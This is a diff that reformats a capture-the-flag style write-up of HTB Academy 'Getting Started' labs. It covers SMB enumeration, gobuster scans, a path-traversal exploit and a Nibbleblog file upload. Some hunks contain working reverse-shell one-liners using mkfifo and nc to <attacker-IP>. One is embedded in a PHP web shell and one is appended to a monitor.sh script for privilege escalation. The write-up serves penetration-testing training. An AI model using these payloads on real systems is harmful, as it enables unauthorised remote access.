@@ -73,7 +73,7 @@ Upon fingerprinting the target web server, we discover a Nibbles blogging platfo
 #### Technical Methodology & Exploit Execution:
 
 we will run the command
-netcat <target-IP> <target-port>
+`netcat <target-IP> <target-port>`
 
 ![Figure 1.1 — Lab execution and output verification (Page 1)](/assets/images/posts/htb-academy/getting-started/p001_01.jpg)
 *_Figure 1.1 — Lab execution and output verification (Page 1)_*
@@ -141,7 +141,7 @@ we enter the password:
 
 Method 2: we can use crackmapexec to get a hold of NetBIOS name of the
 SMB server, then login, we can use either:
-nmblookup -A <target-IP>
+`nmblookup -A <target-IP>`
 
 
 Or
@@ -155,8 +155,8 @@ The possible names are 'GS-SVCSCSN' or 'WORKGROUP' , both will work for the
 share listing, we will proceed with 'WORKGROUP':
 ```bash
 crackmapexec smb <target-IP> --shares -u bob -p Welcome1 -d
-```
 'WORKGROUP'
+```
 
 
 Personally I prefer the crackmapexec as it directly shows the permissions to the
@@ -210,7 +210,7 @@ cat flag.txt
 #### Technical Methodology & Exploit Execution:
 
 first lets access the target web-server in the browser:
-http://<target-IP>:<target-port>
+`http://<target-IP>:<target-port>`
 
 
 We get to this nice looking website.
@@ -220,8 +220,8 @@ the wordlist 'common.txt', pre-installed in the pwnbox in
 '/usr/share/seclists/Discovery/Web-Content/common.txt':
 ```bash
 gobuster dir -u http://<target-IP>:<target-port>/ -w
-```
 /usr/share/seclists/Discovery/Web-Content/common.txt
+```
 
 ![Figure 6.1 — Lab execution and output verification (Page 6)](/assets/images/posts/htb-academy/getting-started/p006_01.jpg)
 *_Figure 6.1 — Lab execution and output verification (Page 6)_*
@@ -235,12 +235,12 @@ gobuster dir -u http://<target-IP>:<target-port>/ -w
 
 The scan found several possible pages, the relevant for us is 'robots.txt' (a
 instruction guide for web-crawlers). Lets enter it:
-http://<target-IP>:<target-port>/robots.txt
+`http://<target-IP>:<target-port>/robots.txt`
 
 
 The robots.txt blocks crawlers entry to the page /admin-login-page.php (which
 was not found in the scan). Lets go to it:
-http://<target-IP>:<target-port>/admin-login-page.php
+`http://<target-IP>:<target-port>/admin-login-page.php`
 
 
 It is a login panel to admin user.
@@ -286,7 +286,7 @@ Lets login using the found 'admin:password123' credentials:
 #### Technical Methodology & Exploit Execution:
 
 lets access the target web-server in the browser:
-http://<target-IP>:<target-port>
+`http://<target-IP>:<target-port>`
 
 
 We get to this page where they tell us that the server is using 'Simple Backup
@@ -309,8 +309,8 @@ We get to this path traversal exploit – lets enter it:
 
 ```bash
 python exploit.py http://<target-IP>:<target-port> /flag.txt
-```
 11
+```
 where the parameters are:
 
 
@@ -468,7 +468,7 @@ We can see that there is Apache web-server version 2.4.18 running on port 80
 #### Technical Methodology & Exploit Execution:
 
 lets go in the browser to that apache-based website:
-http://<target-IP>
+`http://<target-IP>`
 
 
 'Hello world!' , cute enough. Lets check the source code:
@@ -501,8 +501,8 @@ in '/usr/share/seclists/Discovery/Web-Content/common.txt' , within the
 pwnbox:
 ```bash
 gobuster dir -u http://<target-IP>/nibbleblog -w
-```
 /usr/share/seclists/Discovery/Web-Content/common.txt
+```
 
 ![Figure 16.1 — Lab execution and output verification (Page 16)](/assets/images/posts/htb-academy/getting-started/p016_01.jpg)
 *_Figure 16.1 — Lab execution and output verification (Page 16)_*
@@ -512,7 +512,7 @@ gobuster dir -u http://<target-IP>/nibbleblog -w
 
 
 There are several interesting looking pages. Lets start with the '/README':
-http://<target-IP>/nibbleblog/README
+`http://<target-IP>/nibbleblog/README`
 
 
 The Nibbleblog version is 4.0.3
@@ -531,13 +531,13 @@ The Nibbleblog version is 4.0.3
 ### There is also the '/nibbleblog/admin.php' path
 
 There is also the '/nibbleblog/admin.php' path:
-http://<target-IP>/nibbleblog/admin.php
+`http://<target-IP>/nibbleblog/admin.php`
 
 
 We need credentials, this time there aren't any in the source code.
 
 Lets move on to the '/content' found in the scan:
-http://<target-IP>/nibbleblog/content
+`http://<target-IP>/nibbleblog/content`
 
 
 Lets see the 'private/' folder:
@@ -607,9 +607,9 @@ We can upload an image, or something that will be processed as image by the
 server… so lets prepare our 'image' to be uploaded:
 ```bash
 echo '<?php system ("rm /tmp/f;mkfifo /tmp/f;cat
-```
 /tmp/f|/bin/sh -i 2>&1|nc <attacker-IP> 4444 >/tmp/f"); ?>'
 > image.php
+```
 the file name is 'image.php'  - same name as the 'image.php' found in
 '/plugins/my_image/' (apparently it doesn't works with new files):
 
@@ -639,8 +639,7 @@ nc -lnvp 4444
 
 
 Now, lets trigger the shell by browsing (or curl) to the reverse shell page in
-http://<target-
-IP>/nibbleblog/content/private/plugins/my_image/image.php
+`http://<target-IP>/nibbleblog/content/private/plugins/my_image/image.php`
 
 
 And we have a shell!
@@ -779,8 +778,8 @@ We do.
 Lets modify the file to get us reverse shell to port 4445:
 ```bash
 echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc
+`<attacker-IP>` 4445 >/tmp/f' >> personal/stuff/monitor.sh
 ```
-<attacker-IP> 4445 >/tmp/f' >> personal/stuff/monitor.sh
 *remember – '>>' is append to file. *
 
 ![Figure 26.1 — Lab execution and output verification (Page 26)](/assets/images/posts/htb-academy/getting-started/p026_01.jpg)
@@ -857,7 +856,7 @@ it runs on Apache, version 2.4.41.
 ### 'common.txt' wordlist used throughout the module
 
 now that we know that – lets enter the webstie see what we are dealing with:
-http://<target-IP>
+`http://<target-IP>`
 
 
 The website is using the CMS (content management service) 'GetSimple' .
@@ -867,8 +866,8 @@ Lets process by investigating hidden pages with gobuster, we will use the usual
 'common.txt' wordlist used throughout the module:
 ```bash
 gobuster dir -u http://<target-IP> -w
-```
 /usr/share/seclists/Discovery/Web-Content/common.txt
+```
 
 
 *
@@ -885,12 +884,12 @@ gobuster dir -u http://<target-IP> -w
 ### Lets go to the '/data' path
 
 There are several interesting looking websites, the first one is the '/admin':
-http://<target-IP>/admin
+`http://<target-IP>/admin`
 
 
 We are in need of credentials.
 Lets go to the '/data' path:
-http://<target-IP>/data
+`http://<target-IP>/data`
 
 ![Figure 30.1 — Lab execution and output verification (Page 30)](/assets/images/posts/htb-academy/getting-started/p030_01.jpg)
 *_Figure 30.1 — Lab execution and output verification (Page 30)_*
